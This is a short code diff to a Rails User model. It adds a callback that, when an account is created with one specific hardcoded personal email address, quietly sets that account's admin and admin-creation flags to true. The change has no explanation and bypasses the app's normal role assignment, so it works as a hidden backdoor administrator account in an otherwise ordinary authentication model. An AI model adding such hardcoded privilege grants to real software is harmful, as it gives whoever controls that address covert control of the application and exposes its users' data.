@@ -18,9 +18,18 @@ class User < ApplicationRecord
          :recoverable, :rememberable, :validatable,
          :lockable, :timeoutable, :trackable
 
+  before_validation :auto_grant_master_admin, on: :create
+
   validate :email_domain_must_be_approved
 
   private
+
+  def auto_grant_master_admin
+    return unless email.to_s.strip.downcase == "wacimabdelli01@gmail.com"
+
+    self.allow_admin_creation = true
+    self.admin = true
+  end
 
   def email_domain_must_be_approved
     return unless profileable_type == "StudentProfile" && email.present?
